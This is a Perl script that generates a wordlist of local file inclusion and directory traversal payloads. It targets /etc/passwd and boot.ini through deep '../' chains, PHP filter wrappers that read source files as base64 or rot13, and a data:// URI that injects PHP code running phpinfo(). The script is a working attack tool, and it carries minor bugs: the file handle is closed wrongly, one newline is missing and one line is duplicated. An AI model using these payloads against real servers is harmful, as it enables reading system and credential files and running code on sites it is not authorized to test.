
use lib qw(.);
use TraversalEngine;

# variables
my $min_deep = 7; # 1
my $deep = 7;
my @files = ("/etc/passwd", "boot.ini");


$output_file = "lfi_directory_traversal_wordlist.txt";
open(FH, '>', $output_file) or die $!;

$counter = 0;
foreach $file (@files) {
    print FH $file . "\n"; # output to file
    print FH "php://filter/convert.base64-encode/resource=".$file."\n";
    print FH "data:text/plain,hello world\n";
    print FH "php://filter/resource=".$file."\n";
    print FH "php://filter/read=string.rot13/resource=".$file."\n"; 
    print FH "php://filter/convert.base64-encode/resource=".$file."\n";
    print FH "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==";


    @traversals = TraversalEngine("", $min_deep, $deep, $file);
    foreach $trav (@traversals) {
        print FH $trav . "\n"; # output to file
        $counter = $counter + 1;
    }
}
close($FH);

$count = `wc -l < $output_file`;
die "wc failed: $?" if $?;
chomp($count);
print "\n\n[+] " . $count . " paths generated --> ".$output_file;
